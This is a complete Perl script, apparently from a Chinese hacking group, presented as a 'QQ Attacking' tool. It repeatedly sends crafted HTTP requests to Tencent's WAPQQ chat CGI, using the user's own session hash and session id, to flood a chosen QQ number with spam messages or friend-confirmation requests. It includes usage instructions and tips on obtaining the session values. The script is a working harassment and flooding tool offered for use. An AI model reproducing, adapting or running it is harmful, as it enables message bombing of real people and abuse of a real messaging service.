#!/usr/bin/perl
#Code By Roy<Roy@c4st.cn>
#Script For QQ Attacking

$|=1;
use Socket;
use Getopt::Std;
#��ȡ�ⲿ����
getopt('aytgkl');

print "\n             ===================================================\n";
print "                       Perl Script For QQ Attacking\n";
print "                          Code By Roy<Roy@c4st.cn>     \n";
print "                       Visit:luoyi.com & c4st.cn              \n";
print "             ===================================================\n";

#����������Ҫ������ʾʹ�÷���
&usage unless ( defined($opt_a) && defined($opt_y) && defined($opt_t) && defined($opt_g) && defined($opt_k));

#���ⲿ���������ڲ�����
$mode=$opt_a;
$time=$opt_l||1;
$urqq=$opt_y;
$targ=$opt_t;
$pg=$opt_g;
$pk=$opt_k;

#�����˹�����ʹ�õ��ķ�����,waptest.tencent.com��WAPQQ��������õķ�����
$host="waptest.tencent.com";
$port=80;

#����"��֤����"��ʽ����
if ($mode eq "c"){
print"Attacking ...";
for ($i=1;$i<=$time;$i++){
&attack2;
}
print"\nDone!.";
}
#����"��ͨ��Ϣ"��ʽ����
elsif ($mode eq "n"){
print"Attacking ...";
for ($i=1;$i<=$time;$i++){
&attack1;
}
print"\nDone!.";
}
else
{&usage};

#"��ͨ��Ϣ"��ʽ��������,�������߽��յ�����"10001 Is Coming"����Ϣ,���Ҫ�޸���Ϣ����,���޸�Psendmsg����
sub attack1 {
$req = "GET /cgi-bin/wapqq_chat.cgi?Pc=11&Pq=$urqq&Pg=$pg&Poq=$targ&Pk=$pk&Psendmsg=$urqq%20Is%20Coming&PMisc_mid=123456789&stn=gmcc_try HTTP/1.1\n".
       "Accept: text/vnd.wap.wml, application/vnd.wap.wmlc, image/vnd.wap.wbmp, image/gif, image/jpeg, text/vnd.wap.wmlscript, application/vnd.wap.wmlscriptc\n".
       "User-Agent: C4ST(^-^)\n".
       "Host: waptest.tencent.com\n".
       "\n\n";
print "\n";
sendraw($req);
}

#"��֤����"��ʽ��������,�������߽��յ�����"10001 Is Coming"����Ϣ,���Ҫ�޸���Ϣ����,���޸�PConfirmInfo����
sub attack2 {
$req = "GET /cgi-bin/wapqq_chat.cgi?Pc=27&Pq=$urqq&Pg=$pg&Poq=$targ&Pk=$pk&PConfirmInfo=$urqq%20Is%20Coming&PMisc_mid=123456789&stn=gmcc_try HTTP/1.1\n".
       "Accept: text/vnd.wap.wml, application/vnd.wap.wmlc, image/vnd.wap.wbmp, image/gif, image/jpeg, text/vnd.wap.wmlscript, application/vnd.wap.wmlscriptc\n".
       "User-Agent: C4ST(^-^)\n".
       "Host: waptest.tencent.com\n".
       "\n\n";
print "\n";
sendraw($req);
}

#��ʾʹ�÷����ĺ���,PG��PK��ֵ�����ڵ�½WAPQQ��鿴Դ������õ�
sub usage {
print qq~
Usage: $0 -a <Attack Mode> -l <Loops Of Attacking> -y <Your QQ Number> -t <Target To Attack> -pg <PG For Your WAPQQ> -pk <PK For Your Session>

    -a   =Attack Mode,Choose "n" For Normal QQ Msg Type,Or Choose "c" For Confirm QQ Msg Type 
    -l   =Loops Of Attacking,The Times To Attack The Target
    -y   =Your QQ Number
    -t   =Target To Attack,QQ Number
    -g  =PG For Your WAPQQ(1)
    -k  =PK For Your Session(1)

(1)HowTo Get PG And PK:

PG is your QQ password's hash used in WAPQQ site.PK is the session id for your current visiting at WAPQQ site.You can get them once you logged on WAPQQ via your mobile,wap browser(eg.WinWAP) or wap2web service(eg.http://www.easywap.ch/Wap2Web.html).
~;
exit;
}

#Socket����
sub sendraw { 
    my ($req) = @_; 
    my $target; 
    $target = inet_aton($host) || die("inet_aton problems\n"); 
    socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n"); 
    if(connect(S,pack "SnA4x8",2,$port,$target)){ 
        select(S); 
    $| = 1; 
        print $req; 
    close(S); 
         return true;
    }
    else { 
    die("Can't connect...\n"); 
    }
}